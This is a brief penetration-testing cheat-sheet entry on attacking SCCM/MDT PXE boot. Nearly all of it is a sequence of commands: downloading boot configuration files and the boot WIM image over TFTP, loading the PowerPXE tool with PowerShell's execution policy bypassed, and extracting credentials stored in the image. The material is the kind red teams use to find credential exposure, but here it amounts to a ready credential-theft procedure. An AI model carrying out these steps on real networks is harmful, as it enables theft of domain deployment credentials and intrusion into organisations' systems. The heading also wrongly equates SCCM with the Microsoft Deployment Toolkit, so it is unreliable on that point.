# SCCM (Microsoft Deployment Toolkit)

### **Preboot Execution Environment (PXE) boot**

* IP of the MDT server via DHCP
* Retrieve names of the BCD files
* Use TFTP to request these BCD files and enumerate the configuration for all of them
* `tftp -i <sccm-ip> GET "\Tmp\<filename>.bcd" conf.bcd`
* [powerpxe](https://github.com/wavestone-cdt/powerpxe) - `powershell -executionpolicy bypass`  -> `Import-Module .\PowerPXE.ps1` -> `$BCDFile = "conf.bcd"`  -> `Get-WimFile -bcdFile $BCDFile`&#x20;
* `tftp -i <sccm-ip> GET "<pxe-image-location>" pxeboot.wim`&#x20;
* `Get-FindCredentials -WimFile pxeboot.wim`
* [internal-pxe-boot-image](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/internal-pxe-boot-image/)
